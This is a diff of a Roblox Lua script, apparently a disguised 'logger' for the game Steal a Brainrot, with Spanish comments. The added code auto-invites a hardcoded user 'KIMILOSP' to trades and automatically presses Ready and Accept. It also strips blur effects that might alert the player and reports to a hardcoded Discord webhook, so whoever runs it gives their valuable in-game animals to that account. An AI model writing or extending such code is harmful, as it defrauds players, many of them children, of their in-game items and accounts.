@@ -1,14 +1,20 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX + UI TRADE ADAPT
   · Target único: KIMILOSP (UserId resuelto automáticamente)
   · Todos los eventos van a un solo webhook
   · Listas actualizadas con la última update
+  · Arquitectura de envío/aceptación por UI y resolución de remotes adaptada
 ============================================================
 ]]
 
 getgenv().TARGET_USERNAME = "KIMILOSP"
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
+
+-- Flags configurables (seguros para no romper el flujo original)
+getgenv().SAB_UI_FALLBACK_INVITE = getgenv().SAB_UI_FALLBACK_INVITE ~= false
+getgenv().SAB_UI_AUTO_READY_ACCEPT = getgenv().SAB_UI_AUTO_READY_ACCEPT ~= false
+getgenv().SAB_CLEAN_BLUR_AND_FOV = getgenv().SAB_CLEAN_BLUR_AND_FOV ~= false
 
 getgenv().ALLOWED_ANIMALS = {
   "Spyder Elephant", "Strawberry Elephant", "Meowl", "John Pork", "Skibidi Toilet",
@@ -492,9 +498,15 @@ end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+local Lighting = game:GetService("Lighting")
 local localPlayer = Players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+local okVim, VirtualInputManager = pcall(function()
+	return game:GetService("VirtualInputManager")
+end)
 
 task.spawn(function()
 	if not game:IsLoaded() then
@@ -623,9 +635,20 @@ task.spawn(function()
 		tbl5[k] = v
 	end
 
+	-- Resolución adaptativa: busca primero por nombre en Packages.Net (log SAB) y usa el índice legado como fallback
 	local function fn(arg)
-		local children = game:GetService("ReplicatedStorage").Packages.Net:GetChildren()
+		local netFolder = ReplicatedStorage:FindFirstChild("Packages")
+		netFolder = netFolder and netFolder:FindFirstChild("Net")
+		if not netFolder then
+			return nil
+		end
 
+		local direct = netFolder:FindFirstChild(arg)
+		if direct and (direct:IsA("RemoteFunction") or direct:IsA("RemoteEvent")) then
+			return direct
+		end
+
+		local children = netFolder:GetChildren()
 		local v = ({
 			["RF/TradeService/Invite"] = 36,
 			["RE/TradeService/Ready"] = 42,
@@ -648,6 +671,312 @@ task.spawn(function()
 		return nil
 	end
 
+	-- Helpers adaptados de autosendtradedefinitivoperocorregir.txt y autoaccept.txt
+	local lastUiFire = 0
+
+	local function isAncestorVisibleToGui(inst)
+		if not inst then
+			return false
+		end
+		if inst:IsA("GuiObject") and not inst.Visible then
+			return false
+		end
+		local p = inst.Parent
+		while p and p ~= playerGui do
+			if p:IsA("GuiObject") and not p.Visible then
+				return false
+			end
+			p = p.Parent
+		end
+		return true
+	end
+
+	local function fireImageButtonClean(btn)
+		if not btn or not btn:IsA("ImageButton") then
+			return false
+		end
+		if not isAncestorVisibleToGui(btn) then
+			return false
+		end
+		local now = os.clock()
+		if now - lastUiFire < 0.35 then
+			return false
+		end
+		lastUiFire = now
+
+		local fired = false
+		if getconnections then
+			for _, sigName in ipairs({ "Activated", "MouseButton1Click" }) do
+				local ok, conns = pcall(function()
+					return getconnections(btn[sigName])
+				end)
+				if ok and type(conns) == "table" then
+					for _, conn in ipairs(conns) do
+						if conn.Fire then
+							pcall(function()
+								conn:Fire()
+								fired = true
+							end)
+						elseif conn.Function then
+							pcall(function()
+								conn.Function()
+								fired = true
+							end)
+						end
+					end
+				end
+			end
+		end
+		if not fired and firesignal then
+			pcall(function()
+				if btn.Activated then
+					firesignal(btn.Activated)
+					fired = true
+				elseif btn.MouseButton1Click then
+					firesignal(btn.MouseButton1Click)
+					fired = true
+				end
+			end)
+		end
+		return fired
+	end
+
+	local function resolveClickableButton(inst)
+		if not inst then
+			return nil
+		end
+		if inst:IsA("GuiButton") then
+			return inst
+		end
+		local btnDesc = inst:FindFirstChildWhichIsA("GuiButton", true)
+		if btnDesc then
+			return btnDesc
+		end
+		local curr = inst.Parent
+		while curr and curr ~= playerGui do
+			if curr:IsA("GuiButton") then
+				return curr
+			end
+			curr = curr.Parent
+		end
+		return nil
+	end
+
+	local function triggerGuiButtonClean(inst)
+		local btn = resolveClickableButton(inst) or inst
+		if not btn then
+			return false
+		end
+		if btn:IsA("ImageButton") then
+			return fireImageButtonClean(btn)
+		end
+
+		local triggered = false
+		if firesignal then
+			pcall(function()
+				if btn.MouseButton1Down then
+					firesignal(btn.MouseButton1Down)
+				end
+			end)
+			pcall(function()
+				if btn.MouseButton1Click then
+					firesignal(btn.MouseButton1Click)
+					triggered = true
+				end
+			end)
+			pcall(function()
+				if btn.Activated then
+					firesignal(btn.Activated)
+					triggered = true
+				end
+			end)
+		end
+		if getconnections then
+			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
+				local ok, conns = pcall(function()
+					return getconnections(btn[sigName])
+				end)
+				if ok and type(conns) == "table" then
+					for _, conn in ipairs(conns) do
+						if conn.Function then
+							pcall(function()
+								conn.Function()
+								triggered = true
+							end)
+						end
+					end
+				end
+			end
+		end
+		if not triggered and btn:IsA("GuiButton") then
+			pcall(function()
+				GuiService.SelectedObject = btn
+			end)
+		end
+		return triggered
+	end
+
+	local function findLeftTradeButton()
+		local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
+		if leftCenter then
+			local exact = leftCenter:FindFirstChild("TradePlayerList", true)
+			if exact then
+				return resolveClickableButton(exact) or exact
+			end
+		end
+		return nil
+	end
+
+	local function findSearchBox(root)
+		if not root then
+			return nil
+		end
+		for _, desc in ipairs(root:GetDescendants()) do
+			if desc:IsA("TextBox") then
+				return desc
+			end
+		end
+		return nil
+	end
+
+	local function pressEnterOnSearchBox(box, textToType)
+		if not box or not box:IsA("TextBox") then
+			return false
+		end
+		return pcall(function()
+			box:CaptureFocus()
+			box.Text = textToType
+			task.wait(0.05)
+			if okVim and VirtualInputManager then
+				pcall(function()
+					VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+					task.wait(0.03)
+					VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+				end)
+			end
+			if box.FocusLost then
+				pcall(function()
+					box.FocusLost:Fire(true)
+				end)
+			end
+			box:ReleaseFocus()
+		end)
+	end
+
+	local function findTargetSendButton(root, tName, tId)
+		if not root then
+			return nil
+		end
+		local lowerTarget = tostring(tName or ""):lower()
+		local exactRowName = lowerTarget .. "_" .. tostring(tId or "")
+
+		for _, desc in ipairs(root:GetDescendants()) do
+			local dn = desc.Name:lower()
+			if (exactRowName ~= "_" and dn == exactRowName) or (lowerTarget ~= "" and dn:find(lowerTarget, 1, true)) then
+				local sendInst = desc:FindFirstChild("Send", true)
+				if sendInst then
+					return resolveClickableButton(sendInst) or sendInst
+				end
+				for _, sub in ipairs(desc:GetDescendants()) do
+					local sn = sub.Name:lower()
+					if sn:find("send", 1, true) or sn:find("enviar", 1, true) then
+						return resolveClickableButton(sub) or sub
+					end
+				end
+			end
+		end
+		return nil
+	end
+
+	local function findCloseButton(root)
+		if not root then
+			return nil
+		end
+		for _, desc in ipairs(root:GetDescendants()) do
+			local n = desc.Name:lower()
+			if n == "x" or n == "close" or n:find("close", 1, true) then
+				local btn = resolveClickableButton(desc)
+				if btn then
+					return btn
+				end
+			end
+			if (desc:IsA("TextButton") or desc:IsA("TextLabel")) and desc.Text:gsub("%s+", ""):lower() == "x" then
+				return resolveClickableButton(desc) or desc
+			end
+		end
+		return nil
+	end
+
+	local function trySendTradeViaUi(tName, tId)
+		if not getgenv().SAB_UI_FALLBACK_INVITE then
+			return false
+		end
+		local sent = false
+		for attempt = 1, 8 do
+			local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
+			local sendBtn = findTargetSendButton(tradeListGui or playerGui, tName, tId)
+
+			if not sendBtn then
+				local openBtn = findLeftTradeButton()
+				if openBtn then
+					triggerGuiButtonClean(openBtn)
+					task.wait(0.25)
+					tradeListGui = playerGui:FindFirstChild("TradePlayerList")
+				end
+				local searchBox = findSearchBox(tradeListGui or playerGui)
+				if searchBox then
+					pressEnterOnSearchBox(searchBox, tName)
+					task.wait(0.25)
+				end
+				sendBtn = findTargetSendButton(tradeListGui or playerGui, tName, tId)
+			end
+
+			if sendBtn and not sent then
+				if triggerGuiButtonClean(sendBtn) then
+					sent = true
+					task.wait(0.25)
+					local closeBtn = findCloseButton(tradeListGui or playerGui)
+					if closeBtn then
+						triggerGuiButtonClean(closeBtn)
+					end
+					break
+				end
+			end
+			task.wait(0.35)
+		end
+		return sent
+	end
+
+	local function tryUiReadyOrAcceptForTarget()
+		if not getgenv().SAB_UI_AUTO_READY_ACCEPT then
+			return
+		end
+		local tradeGui = playerGui:FindFirstChild("TradeLiveTrade")
+		if not tradeGui then
+			return
+		end
+		local main = tradeGui:FindFirstChild("TradeLiveTrade")
+		local other = main and main:FindFirstChild("Other")
+		local usernameObj = other and other:FindFirstChild("Username")
+		if usernameObj and usernameObj:IsA("TextLabel") and usernameObj.Text ~= "" then
+			if not isTargetName(usernameObj.Text) then
+				return
+			end
+		end
+		local readyBtn = other and other:FindFirstChild("ReadyButton")
+		local txtObj = readyBtn and readyBtn:FindFirstChild("Txt")
+		if readyBtn and txtObj and txtObj:IsA("TextLabel") then
+			local label = string.upper(txtObj.Text or "")
+			if label == "READY" or label == "ACCEPT" then
+				if readyBtn:IsA("ImageButton") then
+					fireImageButtonClean(readyBtn)
+				else
+					triggerGuiButtonClean(readyBtn)
+				end
+			end
+		end
+	end
+
 	local function fn2()
 		local leftCenter = playerGui:FindFirstChild("LeftCenter")
 
@@ -668,11 +997,27 @@ task.spawn(function()
 			end)
 		end
 
+		local function destroyPostEffect(obj)
+			if not getgenv().SAB_CLEAN_BLUR_AND_FOV then
+				return
+			end
+			if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then
+				task.defer(function()
+					pcall(function()
+						obj.Enabled = false
+						obj:Destroy()
+					end)
+				end)
+			end
+		end
+
 		local function fn3(child)
 			if child:IsA("BlurEffect") then
 				task.defer(function()
 					child:Destroy()
 				end)
+			elseif getgenv().SAB_CLEAN_BLUR_AND_FOV and child:IsA("DepthOfFieldEffect") then
+				destroyPostEffect(child)
 			end
 		end
 
@@ -680,6 +1025,13 @@ task.spawn(function()
 
 		for _, child in ipairs(currentCamera:GetChildren()) do
 			fn3(child)
+		end
+
+		if getgenv().SAB_CLEAN_BLUR_AND_FOV then
+			for _, obj in ipairs(Lighting:GetDescendants()) do
+				destroyPostEffect(obj)
+			end
+			Lighting.DescendantAdded:Connect(destroyPostEffect)
 		end
 
 		currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
@@ -1601,13 +1953,18 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── INVITE LOOP (CORREGIDO: siempre invita al único target) ──
+	-- ── INVITE LOOP (CORREGIDO: siempre invita al único target + respaldo por UI) ──
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				pcall(function()
+				local invokedOk = pcall(function()
 					Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
 				end)
+				if not invokedOk then
+					pcall(function()
+						trySendTradeViaUi(targetName, tbl6.targetId)
+					end)
+				end
 			end
 
 			task.wait(2)
@@ -1620,12 +1977,14 @@ task.spawn(function()
 				pcall(function()
 					Ready:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
 				end)
+				pcall(tryUiReadyOrAcceptForTarget)
 
 				task.wait(0.7)
 
 				pcall(function()
 					Accept:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
 				end)
+				pcall(tryUiReadyOrAcceptForTarget)
 
 				if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
 					task.wait(0.15)
